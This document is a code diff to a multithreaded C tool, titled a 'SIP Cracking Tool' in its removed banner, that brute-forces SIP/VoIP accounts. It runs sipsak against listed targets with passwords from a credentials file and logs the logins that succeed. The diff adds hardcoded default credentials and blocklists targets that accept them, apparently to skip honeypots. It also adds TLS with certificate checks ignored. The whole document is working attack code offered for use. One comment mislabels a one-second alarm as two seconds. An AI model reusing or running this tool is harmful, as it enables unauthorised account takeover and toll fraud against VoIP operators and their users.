@@ -7,6 +7,8 @@
 
 #define MAX_LINE 512
 #define COMMAND_SIZE 2048
+#define DEFAULT_USERNAME "MoH123"
+#define DEFAULT_PASSWORD "MoHmOh123544"
 
 typedef struct {
     char target[MAX_LINE];
@@ -26,7 +28,7 @@ int is_target_in_blocklist(const char *target) {
 }
 
 void load_blocklist() {
-    FILE *blocklist = fopen("blocklist.txt", "r");
+    FILE *blocklist = fopen("blocklist.txt", "a+");  // Open for append and reading, create if doesn't exist
     if (!blocklist) {
         perror("Failed to open blocklist file");
         exit(1);
@@ -60,7 +62,7 @@ void *try_login(void *arg) {
     memset(&sa, 0, sizeof(sa));
     sa.sa_handler = &timer_handler;
     sigaction(SIGALRM, &sa, NULL);
-    alarm(1);  // Set the timer for one second
+    alarm(1);  // Set the timer for two seconds
 
     if (is_target_in_blocklist(data->target)) {
         free(data);
@@ -68,9 +70,49 @@ void *try_login(void *arg) {
     }
 
     char command[COMMAND_SIZE];
+    char output[COMMAND_SIZE];
+
+    char protocol_option[64];
+    if (strcmp(data->protocol, "udp") == 0) {
+        strcpy(protocol_option, "udp");
+    } else if (strcmp(data->protocol, "tcp") == 0) {
+        strcpy(protocol_option, "tcp");
+    } else if (strcmp(data->protocol, "tls") == 0) {
+        strcpy(protocol_option, "tls --tls-ignore-cert-failure");
+    } else {
+        fprintf(stderr, "Unsupported protocol: %s\n", data->protocol);
+        free(data);
+        return NULL;
+    }
+
+    // Try the default username and password first
+    snprintf(command, sizeof(command), "sipsak -U %s -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s",
+             protocol_option, DEFAULT_USERNAME, DEFAULT_USERNAME, data->target, DEFAULT_USERNAME, DEFAULT_PASSWORD, data->target, DEFAULT_USERNAME, data->target, data->protocol);
+
+    FILE *cmd_output = popen(command, "r");
+    int is_default_accepted = 0;
+    while (fgets(output, sizeof(output), cmd_output)) {
+        if (strstr(output, "200 OK") || strstr(output, "202 Accepted") || strstr(output, "204 No Notification")) {
+            is_default_accepted = 1;
+            FILE *blocklist = fopen("blocklist.txt", "a");
+            if (blocklist) {
+                fprintf(blocklist, "%s\n", data->target);
+                fclose(blocklist);
+            }
+            break;
+        }
+    }
+    pclose(cmd_output);
+
+    // If default credentials were accepted, return early
+    if (is_default_accepted) {
+        free(data);
+        return NULL;
+    }
+
+    // Now try credentials from credentials.txt
     FILE *credentials = fopen("credentials.txt", "r");
     char credential_line[MAX_LINE];
-    char output[COMMAND_SIZE];
 
     if (!credentials) {
         perror("Failed to open credentials file");
@@ -78,45 +120,27 @@ void *try_login(void *arg) {
         return NULL;
     }
 
-    int is_default_accepted = 0;
-
     while (fgets(credential_line, sizeof(credential_line), credentials)) {
         strtok(credential_line, "\n");  // Remove newline
 
         char *username = strtok(credential_line, ":");
         char *password = strtok(NULL, ":");
 
-        if (strcmp(data->protocol, "tls") == 0) {
-            snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s --tls-ignore-cert-failure",
-                     username, username, data->target, username, password, data->target, username, data->target, data->protocol);
-        } else {
-            snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s",
-                     username, username, data->target, username, password, data->target, username, data->target, data->protocol);
-        }
-
-        FILE *cmd_output = popen(command, "r");
+        snprintf(command, sizeof(command), "sipsak -U %s -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s",
+                protocol_option, username, username, data->target, username, password, data->target, username, data->target, data->protocol);
+				
+        cmd_output = popen(command, "r");
         while (fgets(output, sizeof(output), cmd_output)) {
-            if (strstr(output, "200 OK") || strstr(output, "202 Accepted")) {
-                if (strcmp(username, "anyuser") == 0 && strcmp(password, "anypassword") == 0) {
-                    is_default_accepted = 1;
-                    FILE *blocklist = fopen("blocklist.txt", "a");
-                    if (blocklist) {
-                        fprintf(blocklist, "%s\n", data->target);
-                        fclose(blocklist);
-                    }
-                    break;
-                }
+            if (strstr(output, "200 OK") || strstr(output, "202 Accepted") || strstr(output, "204 No Notification")) {
                 FILE *success_log = fopen("successful_logins.txt", "a");
                 if (success_log) {
                     fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
                     fclose(success_log);
                 }
+                break;
             }
         }
         pclose(cmd_output);
-        if (is_default_accepted) {
-            break;
-        }
     }
 
     fclose(credentials);
@@ -124,17 +148,9 @@ void *try_login(void *arg) {
     return NULL;
 }
 
-void print_program_info() {
-    printf("\033[1;32mSIP Cracking Tool by : Mohamamd Elnwajha\033[0m\n");
-    printf("--------------------------------------\n");
-    printf("\033[1;31mUsage: ./crack <protocol> <threads> <targets_file>\033[0m\n");
-    printf("Example: ./crack tls 500 targets.txt\n");
-    printf("\n");
-}
-
 int main(int argc, char *argv[]) {
     if (argc != 4) {
-        print_program_info();
+        printf("Usage: %s <protocol> <threads> <targets_file>\n", argv[0]);
         return 1;
     }
 
@@ -180,5 +196,8 @@ int main(int argc, char *argv[]) {
 
     fclose(targets);
     free_blocklist();
+
+    printf("Cracking process completed successfully!\n");
+    
     return 0;
 }
